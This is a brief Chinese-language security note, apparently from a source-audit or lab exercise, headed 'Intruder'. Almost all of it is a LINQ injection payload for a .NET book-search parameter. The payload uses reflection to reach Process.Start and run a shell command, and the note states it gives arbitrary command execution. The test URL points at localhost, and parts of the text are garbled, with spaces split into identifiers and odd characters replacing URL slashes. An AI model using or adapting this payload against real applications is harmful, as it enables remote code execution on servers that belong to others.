---
tags: [LINQ注入, RCE, .NET, 源码审计]
---

# Intruder

```
LINQ  injection

http:Ⅱ127.0.0.1:8080/Books?searchString=a%22)%20AND%20%221%22=(%221

构造：

a ")  AND
"" .GetType() .Assembly.DefinedTypes .Where(it .Name  =
"AppDomain") .First() .DeclaredMethods .Where(it .Name  =
"CreateInstanceAndUnwrap") .First() .Invoke("" .GetType() .Assembly.DefinedTypes .W here(it .Name  =  "AppDomain") .First() .DeclaredProperties .Where(it .name  =
"CurrentDomain") .First() .GetValue(null) ,  "System ,  Version  =  4 .0 .0 .0 ,  Culture  = neutral ,  PublicKeyToken  =  b77a5c561934e089;
System .Diagnostics .Process " .Split(" ; " .ToCharArray())) .GetType() .Assembly.Defin edTypes .Where(it .Name  =  "Process") .First() .DeclaredMethods .Where(it .name  =   "Start") .Take(3 ) . Last() .Invoke(null ,
"/usr/bin/touch;/tmp/a " .Split(" ; " .ToCharArray())) .GetType() .ToString()  ≠  "a " AND  "1 "= ("1

即可任意命令执行

```

